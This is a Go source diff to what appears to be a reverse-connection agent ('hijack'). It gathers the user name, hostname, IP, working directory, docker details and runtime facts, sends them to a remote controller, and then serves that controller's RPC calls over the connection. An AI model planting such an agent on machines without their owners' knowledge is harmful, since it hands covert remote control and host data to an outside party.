@@ -6,11 +6,14 @@ import (
 	"io/ioutil"
 	"log"
 	"net"
+	"net/rpc"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	//"time"
 
+	"github.com/invctrl/hijack/protocol"
 	"github.com/navigaid/pretty"
 )
 
@@ -35,9 +38,26 @@ var (
 	whoami     = strings.TrimSpace(string(run(`whoami`)))
 	hostname   = strings.TrimSpace(string(run(`hostname`)))
 	createdAt  = strings.TrimSpace(string(run(`env TZ=Asia/Shanghai docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.CreatedAt}}{{end}}' | grep .`)))
-	commit     string
-	built      string
-	branch     string
+
+	/* // ~/hello-wasm/simple/main.go
+	   fmt.Sprintf("GOOS: %s", runtime.GOOS),
+	   fmt.Sprintf("GOARCH: %s", runtime.GOARCH),
+	   fmt.Sprintf("GOROOT: %s", runtime.GOROOT()),
+	   fmt.Sprintf("Compiler: %s", runtime.Compiler),
+	   fmt.Sprintf("No. of CPU: %d", runtime.NumCPU()),
+	   fmt.Sprintf("In browser: %t", inBrowser()),
+	*/
+
+	goarch    string = runtime.GOARCH
+	goos      string = runtime.GOOS
+	goroot    string = runtime.GOROOT()
+	gc        string = runtime.Compiler
+	goversion string = runtime.Version()
+	ncpu      int    = runtime.NumCPU()
+
+	commit string
+	built  string
+	branch string
 )
 
 type Header struct {
@@ -51,10 +71,18 @@ type Header struct {
 	Pwd        string `json:"pwd"`
 	Whoami     string `json:"whoami"`
 	Hostname   string `json:"hostname"`
-	Commit     string `json:"commit"`
-	Built      string `json:"built"`
-	Branch     string `json:"branch"`
 	CreatedAt  string `json:"created_at"`
+
+	GOARCH    string `json:"goarch"`
+	GOOS      string `json:"goos"`
+	GOROOT    string `json:"goroot"`
+	GC        string `json:"gc"`
+	GOVERSION string `json:"goversion"`
+	NCPU      int    `json:"ncpu"`
+
+	Commit string `json:"commit"`
+	Built  string `json:"built"`
+	Branch string `json:"branch"`
 }
 
 func main() {
@@ -70,29 +98,49 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
-	conn.Write(
-		[]byte(pretty.JSONString(&Header{
-			BuildCode:  buildCode,
-			DockerRepo: dockerRepo,
-			GitBranch:  gitBranch,
-			GitTag:     gitTag,
-			GitSha1:    gitSha1,
-			GitMsg:     gitMsg,
-			IP:         ip,
-			Pwd:        pwd,
-			Whoami:     whoami,
-			Hostname:   hostname,
-			Commit:     commit,
-			Built:      built,
-			Branch:     branch,
-			CreatedAt:  createdAt,
-		})),
-	)
-	// block until "OK" is received, which indicates header has been successfully read by controller
-	// here the result is discarded and not verified
-	ioutil.ReadAll(io.LimitReader(conn, 2))
+	header := pretty.JSONString(&Header{
+		BuildCode:  buildCode,
+		DockerRepo: dockerRepo,
+		GitBranch:  gitBranch,
+		GitTag:     gitTag,
+		GitSha1:    gitSha1,
+		GitMsg:     gitMsg,
+		IP:         ip,
+		Pwd:        pwd,
+		Whoami:     whoami,
+		Hostname:   hostname,
+		CreatedAt:  createdAt,
+
+		GOARCH:    goarch,
+		GOOS:      goos,
+		GOROOT:    goroot,
+		GC:        gc,
+		GOVERSION: goversion,
+		NCPU:      ncpu,
+
+		Commit: commit,
+		Built:  built,
+		Branch: branch,
+	})
+	log.Println(header)
+	conn.Write([]byte(header))
+
+	// block until "OK" or "NO" is received, which indicates if header has been successfully read by controller
+	okno, err := ioutil.ReadAll(io.LimitReader(conn, 2))
+	if err != nil {
+		log.Fatalln(err)
+	}
+	if string(okno) != "OK" {
+		log.Fatalln(string(okno))
+	}
 	log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
-	//time.Sleep(time.Second)
+
+	// rpc.Register(new(protocol.Hello))
+	rpcServer := rpc.NewServer()
+	rpcServer.Register(new(protocol.Hello))
+	log.Println("serveconn")
+	rpcServer.ServeConn(conn)
+	log.Fatalln("bye")
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
 		line := scanner.Text() //+ "\n"
